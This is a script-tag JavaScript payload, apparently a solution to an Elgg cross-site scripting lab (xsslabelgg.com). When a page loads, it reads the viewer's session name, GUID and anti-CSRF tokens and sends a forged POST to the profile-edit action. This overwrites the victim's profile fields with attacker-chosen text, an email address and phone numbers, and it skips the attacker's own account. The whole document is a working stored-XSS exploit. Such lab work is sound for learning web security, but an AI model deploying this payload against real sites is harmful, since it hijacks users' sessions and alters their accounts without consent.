<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var user_name=elgg.session.user.name;
	var user_guid=elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//& b4 token?
	//Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
	var content=token+ts+"&name="+user_name+"&description=meet+me+in+the+alley&accesslevel%5Bdescription%5D=1&briefdescription=1605015&accesslevel%5Bbriefdescription%5D=1&location=archi+r+chipa&accesslevel%5Blocation%5D=1&interests=kechal&accesslevel%5Binterests%5D=1&skills=kechal+badhano&accesslevel%5Bskills%5D=1&contactemail="+user_name+"onlyfan%40yahoo.com&accesslevel%5Bcontactemail%5D=1&phone=90764&accesslevel%5Bphone%5D=1&mobile=018744447&accesslevel%5Bmobile%5D=1&website=https%3A%2F%2Fwww.youtube.com%2F&accesslevel%5Bwebsite%5D=1&twitter=entertainer&accesslevel%5Btwitter%5D=1&guid="+user_guid;
	console.log(user_guid+" "+user_name);

	if(user_guid !== elgg.page_owner.guid && user_guid !== 47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
		 console.log("POST sent");
	}
	}
</script>